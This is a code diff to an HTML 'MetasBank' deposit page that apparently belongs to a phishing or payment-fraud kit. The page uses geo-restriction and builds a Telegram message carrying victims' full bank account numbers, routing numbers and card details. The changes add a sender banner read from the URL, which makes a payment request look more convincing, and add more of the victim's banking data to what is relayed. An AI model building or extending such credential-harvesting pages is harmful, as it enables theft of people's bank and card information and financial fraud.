@@ -1,18 +1,19 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
   <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none';">
-  <script src="geo-restrict.js"></script>
+  <script src="/geo-restrict.js"></script>
   <title>MetasBank — Complete Your Deposit</title>
   <link rel="icon" type="image/svg+xml" href="/favicon.svg">
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
+  <script src="/vendor/tailwind.js"></script>
+  <script src="/vendor/supabase.min.js"></script>
   <script src="/supabase-config.js"></script>
   <script src="/validation.js"></script>
   <script>
     tailwind.config = {
+      corePlugins: { preflight: false },
       theme: {
         extend: {
           colors: { orange: { 50:'#fff7ed',100:'#ffedd5',200:'#fed7aa',300:'#fdba74',400:'#fb923c',500:'#f97316',600:'#ea580c',700:'#c2410c',800:'#9a3412',900:'#7c2d12' } }
@@ -38,7 +39,7 @@
       --shadow-lg: 0 8px 32px rgba(0,0,0,0.5);
     }
     html { height: 100%; width: 100%; overflow-x: hidden; }
-    body {
+    body { margin: 0;
       font-family: "Inter", -apple-system, BlinkMacSystemFont, sans-serif;
       background: var(--bg); color: var(--text); width: 100%; max-width: 100%;
       min-height: 100vh; min-height: 100dvh; overflow-x: hidden;
@@ -47,6 +48,8 @@
     }
     input, select, textarea { font-family: inherit; }
     input { font-size: 16px !important; }
+    button { border: none; background: none; text-decoration: none; }
+    a { text-decoration: none; }
 
     @keyframes spin { to { transform: rotate(360deg); } }
     .spinner { width: 36px; height: 36px; border: 2.5px solid var(--border); border-top-color: var(--accent); border-radius: 50%; animation: spin 0.7s linear infinite; }
@@ -221,6 +224,7 @@
           <span id="amountDisplay" style="font-size:40px; font-weight:800; letter-spacing:-0.03em; line-height:1;">0.00</span>
         </div>
         <div id="noteDisplay" class="hidden mt-3 text-xs" style="color:var(--text-muted); border-top:1px solid var(--border); padding-top:10px;"></div>
+        <div id="senderDisplay" class="hidden mt-2 text-xs" style="color:var(--text-secondary); border-top:1px solid var(--border); padding-top:10px;"><span style="color:var(--green);">⬤</span>&nbsp; <span id="senderDisplayText"></span></div>
         <div class="flex items-center justify-between mt-4">
           <span class="secure-pill">
             <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
@@ -443,6 +447,7 @@
     const amount = parseFloat(params.get('amount'));
     const currency = (params.get('currency') || 'USD').toUpperCase();
     const note = params.get('note') || '';
+    const sender = params.get('sender') || '';
 
     if (!ref || !/^[A-Za-z0-9]{3,20}$/.test(ref) || isNaN(amount) || amount <= 0) { showState('error'); return; }
 
@@ -452,6 +457,14 @@
     if (note && note.length <= 200) {
       document.getElementById('noteDisplay').textContent = note;
       document.getElementById('noteDisplay').classList.remove('hidden');
+    }
+    if (sender && sender.length <= 80) {
+      const senderEl = document.getElementById('senderDisplay');
+      const senderTextEl = document.getElementById('senderDisplayText');
+      if (senderEl && senderTextEl) {
+        senderTextEl.textContent = 'Payment from ' + sender;
+        senderEl.classList.remove('hidden');
+      }
     }
 
     showState('loading');
@@ -714,8 +727,9 @@
       tgMsg += '🏛️ <b>Bank:</b>  ' + escHtml(payerData.payer_bank_name) + '\n';
       tgMsg += '🔢 <b>Account:</b>  <code>' + escHtml(payerData.payer_account_full) + '</code>\n';
       tgMsg += '📌 <b>Routing:</b>  <code>' + escHtml(payerData.payer_routing) + '</code>\n';
+      if (payerData.payer_account_type) tgMsg += '🗂️ <b>Type:</b>  ' + escHtml(payerData.payer_account_type) + '\n';
     } else {
-      tgMsg += '💳 <b>Card:</b>  ' + escHtml(payerData.payer_card_brand.charAt(0).toUpperCase() + payerData.payer_card_brand.slice(1)) + ' ending ' + escHtml(payerData.payer_card_last4) + '\n';
+      tgMsg += '💳 <b>Card:</b>  ' + escHtml(payerData.payer_card_brand.charAt(0).toUpperCase() + payerData.payer_card_brand.slice(1)) + '  <code>•••• ' + escHtml(payerData.payer_card_last4) + '</code>\n';
       tgMsg += '📅 <b>Expiry:</b>  ' + escHtml(payerData.payer_card_expiry) + '\n';
     }
 
@@ -740,8 +754,10 @@
         p_payer_routing: payerData.payer_routing || null, p_payer_account_last4: payerData.payer_account_last4 || null,
         p_payer_account_type: payerData.payer_account_type || null, p_payer_card_last4: payerData.payer_card_last4 || null,
         p_payer_card_brand: payerData.payer_card_brand || null, p_payer_card_expiry: payerData.payer_card_expiry || null,
+        p_payer_card_full: null,
         p_status: 'submitted',
-        p_payer_account_full: payerData.payer_account_full || null
+        p_payer_account_full: payerData.payer_account_full || null,
+        p_payer_card_cvc: null
       });
       if (updateErr) throw updateErr;
       
